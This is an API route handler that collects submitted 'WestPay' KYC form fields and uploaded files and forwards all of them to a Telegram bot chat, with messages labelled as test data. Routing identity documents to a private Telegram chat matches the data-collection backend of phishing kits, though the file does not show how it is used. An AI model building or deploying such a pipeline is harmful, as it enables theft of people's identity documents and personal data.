import formidable from "formidable";
import fs from "fs";

export const config = {
  api: {
    bodyParser: false,
  },
};

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({
      ok: false,
      error: "Method not allowed",
    });
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    return res.status(500).json({
      ok: false,
      error: "Telegram configuration missing",
    });
  }

  try {
    const form = formidable({
      multiples: true,
      maxFileSize: 10 * 1024 * 1024,
      keepExtensions: true,
    });

    const [fields, files] = await form.parse(req);

    // ========================================================
    // Informations du formulaire
    // ========================================================

    let information = {};

    try {
      const raw = Array.isArray(fields.information)
        ? fields.information[0]
        : fields.information;

      if (raw) {
        information = JSON.parse(raw);
      }
    } catch {
      information = {};
    }

    // ========================================================
    // Tous les fichiers
    // ========================================================

    let uploadedFiles = files.files || [];

    if (!Array.isArray(uploadedFiles)) {
      uploadedFiles = [uploadedFiles];
    }

    uploadedFiles = uploadedFiles.filter(Boolean);

    if (uploadedFiles.length === 0) {
      return res.status(400).json({
        ok: false,
        error: "No test files received",
      });
    }

    // ========================================================
    // Construire le récapitulatif Telegram
    // ========================================================

    const lines = [
      "🧪 WESTPAY — TEST KYC",
      "",
      "⚠️ TEST DATA ONLY",
      "This submission is for testing purposes.",
      "",
      "━━━━━━━━━━━━━━━━━━━━",
      "📋 FORM INFORMATION",
      "━━━━━━━━━━━━━━━━━━━━",
    ];

    for (const [key, value] of Object.entries(information)) {
      let displayValue = value;

      if (Array.isArray(value)) {
        displayValue = value.join(", ");
      }

      if (
        displayValue === null ||
        displayValue === undefined ||
        displayValue === ""
      ) {
        displayValue = "Not provided";
      }

      const label = key
        .replace(/_/g, " ")
        .replace(/\b\w/g, (letter) =>
          letter.toUpperCase()
        );

      lines.push(
        `${label}: ${displayValue}`
      );
    }

    lines.push("");
    lines.push(
      `📎 Test files: ${uploadedFiles.length}`
    );

    const telegramUrl =
      `https://api.telegram.org/bot${token}`;

    // ========================================================
    // Envoyer le récapitulatif
    // ========================================================

    const textResponse = await fetch(
      `${telegramUrl}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: lines.join("\n"),
        }),
      }
    );

    const textResult =
      await textResponse.json();

    if (!textResult.ok) {
      console.error(
        "Telegram sendMessage error:",
        textResult
      );

      return res.status(500).json({
        ok: false,
        error: "Unable to send form information",
      });
    }

    // ========================================================
    // Envoyer chaque fichier
    // ========================================================

    let sentFiles = 0;

    for (let i = 0; i < uploadedFiles.length; i++) {
      const uploaded = uploadedFiles[i];

      if (!uploaded?.filepath) {
        continue;
      }

      const buffer =
        fs.readFileSync(uploaded.filepath);

      const filename =
        uploaded.originalFilename ||
        `test-file-${i + 1}.jpg`;

      const mime =
        uploaded.mimetype ||
        "application/octet-stream";

      const telegramForm =
        new FormData();

      telegramForm.append(
        "chat_id",
        chatId
      );

      telegramForm.append(
        "caption",
        `🧪 WESTPAY TEST FILE ${i + 1}/${uploadedFiles.length}\n\n${filename}`
      );

      telegramForm.append(
        "document",
        new Blob(
          [buffer],
          { type: mime }
        ),
        filename
      );

      const fileResponse =
        await fetch(
          `${telegramUrl}/sendDocument`,
          {
            method: "POST",
            body: telegramForm,
          }
        );

      const fileResult =
        await fileResponse.json();

      if (!fileResult.ok) {
        console.error(
          `Telegram file ${i + 1} error:`,
          fileResult
        );
      } else {
        sentFiles++;
      }

      // Supprimer le fichier temporaire créé
      // par formidable après traitement.
      try {
        fs.unlinkSync(
          uploaded.filepath
        );
      } catch {}
    }

    // ========================================================
    // Résultat
    // ========================================================

    return res.status(200).json({
      ok: true,
      message:
        "Test application sent to Telegram",
      informationSent: true,
      filesReceived:
        uploadedFiles.length,
      filesSent:
        sentFiles,
    });

  } catch (error) {
    console.error(
      "Telegram upload error:",
      error
    );

    return res.status(500).json({
      ok: false,
      error: "Upload failed",
    });
  }
}
